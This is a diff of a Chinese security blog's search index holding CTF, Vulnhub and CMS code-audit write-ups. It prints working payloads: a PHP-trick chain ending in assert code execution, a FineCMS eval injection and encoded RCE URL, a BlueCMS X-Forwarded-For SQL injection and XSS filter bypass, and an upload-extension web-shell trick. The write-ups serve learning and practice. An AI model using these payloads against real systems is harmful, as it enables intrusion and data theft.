@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[某CTF的Baby PHP]]></title>
+    <url>%2F2018%2F10%2F18%2F%E6%9F%90CTF%E7%9A%84Baby-PHP%2F</url>
+    <content type="text"><![CDATA[主要考察PHP Trick 源码参上1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 &lt;?phprequire_once('flag.php');error_reporting(0);if(!isset($_GET['msg']))&#123; highlight_file(__FILE__); die();&#125;@$msg = $_GET['msg'];if(@file_get_contents($msg)!=="Hello Challenge!")&#123; die('Wow so rude!!!!1');&#125;echo "Hello Hacker! Have a look around.\n";@$k1=$_GET['key1'];@$k2=$_GET['key2'];$cc = 1337;$bb = 42;if(intval($k1) !== $cc || $k1 === $cc)&#123; die("lol no\n");&#125;if(strlen($k2) == $bb)&#123; if(preg_match('/^\d+＄/', $k2) &amp;&amp; !is_numeric($k2))&#123; if($k2 == $cc)&#123; @$cc = $_GET['cc']; &#125; &#125;&#125;list($k1,$k2) = [$k2, $k1];if(substr($cc, $bb) === sha1($cc))&#123; foreach ($_GET as $lel =&gt; $hack)&#123; $$lel = $hack; &#125;&#125;$‮b = "2";$a="‮b";//;1=bif($$a !== $k1)&#123; die("lel no\n");&#125;// plz die nowassert_options(ASSERT_BAIL, 1);assert("$bb == $cc");echo "Good Job ;)";// TODO// echo $flag; 首先第一点1234@$msg = $_GET['msg'];if(@file_get_contents($msg)!=="Hello Challenge!")&#123; die('Wow so rude!!!!1');&#125; 需要使用php://input,或者是data://text/plain php://iinput形如 1234GET /?msg=php://input HTTP/1.1Host ****Hello Challenge! data://text/plain的话是构造 ?msg=data://text/plain,Hello Challenge! 第二点123if(intval($k1) !== $cc || $k1 === $cc)&#123; die("lol no\n");&#125; 这里的$k1===$cc用的是三个等号进行比较，比较的两个变量要求类型一致，而PHP传参的时候是默认String类型的，所以$key1=1337即可 第三点1234567if(strlen($k2) == $bb)&#123; if(preg_match('/^\d+＄/', $k2) &amp;&amp; !is_numeric($k2))&#123; if($k2 == $cc)&#123; @$cc = $_GET['cc']; &#125; &#125;&#125; 这里需要注意preg_match(&#39;/^\d+＄/&#39;, $k2)中的是＄而非$,所以只要构造$key2=000000000000000000000000000000000001337%EF%BC%84即可绕过 第四点1234567891011if(substr($cc, $bb) === sha1($cc))&#123; foreach ($_GET as $lel =&gt; $hack)&#123; $$lel = $hack; &#125;&#125;$‮b = "2";$a="‮b";//;1=bif($$a !== $k1)&#123; die("lel no\n");&#125; 传值cc[]=此时substr和sha1都会返回false，之后便是变量覆盖，再传参k1=2即可. 第五点1assert("$bb == $cc"); 构造$bb=$GLOBALS;\\即可 所以最后的payload为 1?msg=php://input&amp;key1=1337&amp;key2=000000000000000000000000000000000001337%EF%BC%84&amp;cc[]=&amp;k1=2&amp;bb=var_dump($GLOBALS);//]]></content>
+  </entry>
+  <entry>
     <title><![CDATA[护网杯部分题目Wp]]></title>
     <url>%2F2018%2F10%2F13%2F%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWp%2F</url>
     <content type="text"><![CDATA[还是太菜了，只做出了三道题 迟来的签到题下载文件后是一段字符 AAoHAR1WX1VQVlNVU1VRUl5XXyMjI1FWJ1IjUCQnXlZWXyckXhs= 尝试了下，可以base64解码，不过解出来是乱码 题目提示XOR，flag一般格式为flag{}，所以先试下 chr(ord(a[0]) ^ ord(a[len(a)-1]) ^ ord(&#39;f&#39;)) 可以得到flag了 FEZfez.py 12345678910111213141516171819202122232425262728293031import osdef xor(a,b): assert len(a)==len(b) c="" for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return cdef f(x,k): return xor(xor(x,k),7)def round(M,K): L=M[0:27] R=M[27:54] new_l=R new_r=xor(xor(R,L),K) return new_l+new_rdef fez(m,K): for i in K: m=round(m,i) return mK=[]for i in range(7): K.append(os.urandom(27))m=open("flag","rb").read()assert len(m)&lt;54m+=os.urandom(54-len(m))test=os.urandom(54)print test.encode("hex")print fez(test,K).encode("hex")print fez(m,K).encode("hex") fez.log 123c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd55c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76 方便描述，给fez.log的值赋给三个变量 123a = "c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5"b = "5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81"c = "519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76" b,c都是fez函数得到的，分析看看fez函数，作用是将m分成两段L,R，前后异或处理后与i异或,得到new_R,而R则成了new_L,拼接成m，循环Len(K)次 易知K的长度为7，有Ri,Li,Ki 最后可以得到 123L= R1^K2^K3^K5^K6R = R1^K1^L1^k2^k4^K6^K7 结合a,b,c很轻松得到flag 还剩下一部分思路差不多的 easy_tornado打开题目，有个文件列表 随便访问一个有两个参数，随便修改下 试了下模板注入，可以，只不过是过滤了许多东西，hint里面有一个cookie_secret 用的是tornado,了解到其存在一个hander.settings里面有cookie_secret 得到cookie_secret后加密得到签名，最后拿到flag]]></content>
@@ -69,18 +74,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[BlueCMS 代码审计]]></title>
-    <url>%2F2018%2F10%2F03%2FBlueCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
-    <content type="text"><![CDATA[blueCMS是一款小众的CMS ,网上也有很多漏洞分析之类的文章，用来做代码审计入门练习还是不错的选择 0x00 环境准备 Apache + PHP BlueCMS v1.6 sp1 Mysql监控 0x01大体结构分析入口文件与common函数大致看了下index文件，果然入口文件很难发现漏洞，继续看两个common文件 因为是GBK编码的CMS所以此处可以被宽字节注入，此外就是IP未过滤 0x02 漏洞点测试IP首先测试下IP，全局搜索getip,在comment发现getip并且未做处理就放入SQL中执行 进入comment页面，不知道为什么没有内容显示，只好换个方向，在common.inc文件中$online_ip是由getip得到的 搜索$online_ip后在guest_book文件中发现 测试下功能，确认可用 构造payload X-Forwarded-For:’,database())# 可以在留言中看到数据库名已经出现了 数值型注入在ad_js.php文件中可以发现，$ad_id变量受我们控制，而且插入SQL语句时没用单引号，这就使我们可以直接注入了 union select得到数据库名称 xss漏洞在user.php文件的增加新闻处 content并没有用htmlspecialchars函数过滤，而是采用了filter_data函数 只要关键字大写就可以绕过 创建一个用户后发表一个新闻，content内容为XSS PAYLOAD 切换账号访问新闻页 0x03 总结第一次代码审计一个CMS，果然我还是太菜了，只能发现最基础的一些漏洞，不过慢慢来啦，急不来。]]></content>
-      <categories>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[finecms免费版漏洞分析]]></title>
     <url>%2F2018%2F10%2F03%2Ffinecms%E5%85%8D%E8%B4%B9%E7%89%88%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
     <content type="text"><![CDATA[FineCMS是一款基于PHP+MySql+CI框架开发的高效简洁的中小型内容管理系统 0x00 开始前的准备网上存在许多5.0.X的漏洞分析，本来想找个5.0.x版本的进行分析，结果最后只找到了一个免费版 0x01 寻找漏洞在\extensions\下的function.php文件下有一个函数 其中的 1@eval("\$array = $data;"); 很明显存在漏洞，先测试下 Payload:?a=array();phpinfo() 0x02 漏洞利用回到CMS中，找一下哪里用了这个函数，在function.php文件里发现了一个fn_authcode函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * authcode函数(用于数组) */function fn_authcode($data, $operation = 'DECODE', $key = '', $expiry = 0) &#123; $ckey_length = 4; $string = $operation == 'DECODE' ? $data : array2string($data); $key = md5($key ? $key : SITE_MEMBER_COOKIE); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == 'DECODE') &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123; return string2array(substr($result, 26)); &#125; else &#123; return ''; &#125; &#125; else &#123; return $keyc . str_replace('=', '', base64_encode($result)); &#125;&#125; 发现这个函数在ApiController.php文件中被调用 1$data = fn_authcode(base64_decode($this-&gt;get('file')), 'DECODE'); 这里的file可控，现在只要构造合适的file就可以达成命令执行了,回到fn_authocode函数，这是一个只和SITE_MEMBER_COOKIE有关的函数，而SITE_MEMBER_COOKIE又是一个默认的值，只要将fn_authcode的参数改一下就可以构造成我们要的payload 尝试下 1http://localhost/finecms/?c=api&amp;a=down&amp;file=ZmZlMXhvY3N4ZWluZnpuSEoyUGRBRkhPZ01rcGRQbFdLZ1RJT3pSaG0rR21ab1JyRS96c1dnMnFJT1dTMUVn 0x03 总结这一次漏洞分析还是异常吃力，漏洞函数很容易就发现了，但是漏洞利用的地方找了半天，除此之外就是fn_authocode函数的加解密，长见识了，对网站的整体结构了解还是不够，继续努力。]]></content>
@@ -93,15 +86,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Vulnhub FristiLeaks]]></title>
-    <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
-    <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
+    <title><![CDATA[BlueCMS 代码审计]]></title>
+    <url>%2F2018%2F10%2F03%2FBlueCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
+    <content type="text"><![CDATA[blueCMS是一款小众的CMS ,网上也有很多漏洞分析之类的文章，用来做代码审计入门练习还是不错的选择 0x00 环境准备 Apache + PHP BlueCMS v1.6 sp1 Mysql监控 0x01大体结构分析入口文件与common函数大致看了下index文件，果然入口文件很难发现漏洞，继续看两个common文件 因为是GBK编码的CMS所以此处可以被宽字节注入，此外就是IP未过滤 0x02 漏洞点测试IP首先测试下IP，全局搜索getip,在comment发现getip并且未做处理就放入SQL中执行 进入comment页面，不知道为什么没有内容显示，只好换个方向，在common.inc文件中$online_ip是由getip得到的 搜索$online_ip后在guest_book文件中发现 测试下功能，确认可用 构造payload X-Forwarded-For:’,database())# 可以在留言中看到数据库名已经出现了 数值型注入在ad_js.php文件中可以发现，$ad_id变量受我们控制，而且插入SQL语句时没用单引号，这就使我们可以直接注入了 union select得到数据库名称 xss漏洞在user.php文件的增加新闻处 content并没有用htmlspecialchars函数过滤，而是采用了filter_data函数 只要关键字大写就可以绕过 创建一个用户后发表一个新闻，content内容为XSS PAYLOAD 切换账号访问新闻页 0x03 总结第一次代码审计一个CMS，果然我还是太菜了，只能发现最基础的一些漏洞，不过慢慢来啦，急不来。]]></content>
       <categories>
-        <category>Challenge</category>
+        <category>代码审计</category>
       </categories>
       <tags>
+        <tag>PHP</tag>
         <tag>Web</tag>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -114,6 +107,18 @@
       <tags>
         <tag>Web</tag>
         <tag>redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Vulnhub FristiLeaks]]></title>
+    <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
+    <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
+      <categories>
+        <category>Challenge</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
